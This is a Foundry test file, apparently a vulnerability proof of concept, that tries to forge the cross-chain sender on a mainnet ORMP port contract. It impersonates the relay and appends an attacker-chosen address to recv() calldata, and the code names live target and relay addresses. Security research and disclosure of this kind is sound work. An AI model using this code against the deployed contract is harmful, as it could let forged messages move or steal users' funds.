// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

// Correct interface matching actual ORMPUpgradeablePort
interface IORMPPort {
    function recv(
        address fromDapp,
        address toDapp,
        bytes calldata message
    ) external payable;
}

// Captures the resolved _xmsgSender() value
contract SenderCapture {
    address public captured;
    bool public wasCalled;

    fallback(bytes calldata) external payable
    returns (bytes memory) {
        wasCalled = true;
        // Read last 20 bytes of calldata — mirrors _xmsgSender() assembly
        assembly {
            let ptr := sub(calldatasize(), 20)
            captured := shr(96, calldataload(ptr))
        }
        return "";
    }

    receive() external payable {}
}

contract ORMPPocTest is Test {

    // ORMPUpgradeablePort on ETH mainnet
    address constant TARGET =
        0x2cd1867Fb8016f93710B6386f7f9F1D540A60812;

    // ORMP relay — passes onlyORMP check
    address constant RELAY =
        0x13b2211a7cA45Db2808F6dB05557ce5347e3634e;

    // Registered peer for Arbitrum (chainId 42161)
    address constant PEER =
        0x2cd1867Fb8016f93710B6386f7f9F1D540A60812;

    // Attacker-chosen address to forge as sender
    address constant FORGED =
        0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF;

    uint256 constant FROM_CHAIN = 42161;

    function testPayloadAlignment() public pure {
        // ORMP appends: uint256(fromChainId) + bytes20(message.from)
        // Total suffix = 32 + 20 = 52 bytes
        bytes memory suffix = abi.encodePacked(
            uint256(FROM_CHAIN),
            bytes20(PEER)
        );
        assertEq(suffix.length, 52);
        console.log("suffix length:", suffix.length);
    }

    function testForge_ORMPPort_v13() public {
        SenderCapture c = new SenderCapture();

        // Inner message passed to recv()
        bytes memory message = hex"";

        // Step 1: Build standard ABI-encoded recv() calldata
        bytes memory baseCalldata = abi.encodeWithSelector(
            IORMPPort.recv.selector,
            FORGED,       // fromDapp — attacker chosen
            address(c),   // toDapp — our capture contract
            message
        );

        // Step 2: Append the suffix the relay would add
        // _xmsgSender() reads last 20 bytes = message.from
        bytes memory fullCalldata = bytes.concat(
            baseCalldata,
            abi.encode(uint256(FROM_CHAIN)), // 32 bytes
            bytes20(FORGED)                  // 20 bytes — forged sender
        );

        // Step 3: Call as relay
        vm.prank(RELAY);
        (bool ok,) = TARGET.call(fullCalldata);

        // Step 4: Report results
        console.log("recv() succeeded:", ok);
        console.log("toDapp called:", c.wasCalled());
        console.log("captured sender:", c.captured);
        console.log("forged sender:  ", FORGED);
        console.log(
            "sender forged:",
            c.captured == FORGED
        );

        // Note: ok may be false due to _xmsgSender() == _checkedPeerOf() check
        // The key metric is whether captured == FORGED
        // That proves calldata suffix is attacker-controlled
        assertEq(
            c.captured,
            FORGED,
            "SENDER FORGERY CONFIRMED"
        );
    }
}